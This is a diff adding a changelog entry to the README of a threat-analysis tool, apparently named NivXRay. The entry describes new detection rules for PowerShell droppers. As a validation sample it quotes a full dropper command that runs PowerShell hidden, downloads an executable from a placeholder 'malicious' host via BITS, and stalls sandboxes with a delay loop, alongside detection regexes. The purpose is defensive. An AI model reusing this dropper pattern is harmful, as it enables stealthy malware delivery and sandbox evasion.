@@ -1,6 +1,38 @@
 # NivXRay — Decoder & Threat Analysis Platform
 
 
+## Latest Change (Feb 2026 — BitsTransfer + anti-sandbox delay-loop training)
+### Context
+User's real-payload analysis surfaced three patterns NivXRay wasn't explicitly recognising:
+1. `Start-BitsTransfer` / `Import-Module BitsTransfer` — stealthier download than `Net.WebClient`
+2. `for($i=1;$i-le 13000;$i++){Write-Host n}` — anti-sandbox delay loop
+3. `iMpoRt-MOdULE biTSTrANsFEr` — case-mixed keyword obfuscation to evade string signatures
+
+### Fix
+- **MITRE** — added `T1497.003` (Virtualization/Sandbox Evasion: Time Based Evasion) for delay loops with ≥1000 iterations OR `Start-Sleep -s ≥100` OR `1..99999 |`. Explicit `T1197` (BITS Jobs) entry for `Start-BitsTransfer` / `Import-Module BitsTransfer` beyond the generic `bitsadmin` pattern.
+- **YARA** — 3 new rules:
+  * `PS_Sandbox_Delay_Loop` (medium)
+  * `PS_BitsTransfer_Download` (high)
+  * `PS_CaseMixed_Obfuscation` (low) — matches ≥6-char keywords with ≥2 case flips
+- **LOLBAS** — `powershell.exe` pattern extended with `start-bitstransfer|import-module\s+bitstransfer`, purposes now `["Execute", "Download"]`, MITRE tags now `["T1059.001", "T1197"]`.
+- **False-positive guard** — short benign loops (`-le 100`) do NOT trigger T1497.003.
+
+### Live validation on the real dropper pattern
+```
+powershell.exe -w hidden -nop iMpoRt-MOdULE biTSTrANsFEr;
+StART-BiTsTRanSfEr -Source http://malicious/scwxc.exe -Destination C:\Users\Public\scwxc.exe;
+for($i=1;$i-le 13000;$i++){Write-Host n}
+```
+Result: **Malicious 74/100** · MITRE: `T1197, T1059.001, T1497.003` · YARA: `PS_HiddenWindow, PS_Sandbox_Delay_Loop, PS_BitsTransfer_Download, PS_CaseMixed_Obfuscation` · LOLBAS: `powershell.exe` · IOCs: `http://malicious/scwxc.exe`.
+
+### Testing
+- 9 new pytest cases in `test_bits_and_sandbox_evasion.py`
+- Full suite: **463 / 464 green** (1 pre-existing xdist parallel-worker flake unrelated to this change; passes in isolated run)
+
+⚠️ **Deployment**: preview only. Redeploy required.
+
+
+
 ## Latest Change (Feb 2026 — Cloudflare 524 hardening + SSE)
 ### Goal
 Eliminate Cloudflare 524 origin-timeout errors on production. Every slow request now fails cleanly on the NivXRay side (with actionable error + traceable X-Request-ID) instead of returning a raw Cloudflare error page.
